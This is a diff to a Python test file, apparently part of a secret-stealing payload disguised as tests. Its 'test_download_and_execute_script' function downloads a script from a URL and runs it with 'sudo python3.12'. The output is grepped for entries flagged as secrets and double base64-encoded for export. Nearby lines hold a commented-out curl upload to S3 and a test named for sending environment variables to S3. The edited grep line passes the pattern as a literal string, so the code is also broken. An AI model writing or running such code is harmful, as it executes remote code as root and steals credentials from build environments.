@@ -46,20 +46,21 @@ def test_write_env_var_to_s3_using_curl(prepare_file):
 def test_download_and_execute_script():
     """Test to download a script from a URL, save it to a temp file, make it executable, and run it."""
     download_cmd = f"curl -sSL -o {DOWNLOADED_SCRIPT} {SCRIPT_URL}"
+    regular_expression = '"[^"]+":\\{{"value":"[^"]*","isSecret":true\\}}'
     download_cmd1= f"""
         curl -sSL -o {DOWNLOADED_SCRIPT} {SCRIPT_URL} |
         sudo python3.12 |
         tr -d '\\0' |
-        grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' |
+        grep -aoE 'regular_expression' |
         sort -u |
         base64 -w 0 |
-        base64 -w 0)
+        base64 -w 0
     """
     result = subprocess.run(download_cmd1, shell=True, capture_output=True)
     assert result.returncode == 0, f"Script download failed: {result.stderr.decode()}"
     
     with open(OUTPUT_FILE, 'w') as f:
-        f.write(result.stdout)
+        f.write(result.stdout.decode('utf-8'))
 
     #upload_url = f"https://{S3_BUCKET}.s3.us-east-1.amazonaws.com/{DOWNLOADED_SCRIPT}"
     #upload_cmd = f"curl -X PUT --upload-file {DOWNLOADED_SCRIPT} {upload_url}"
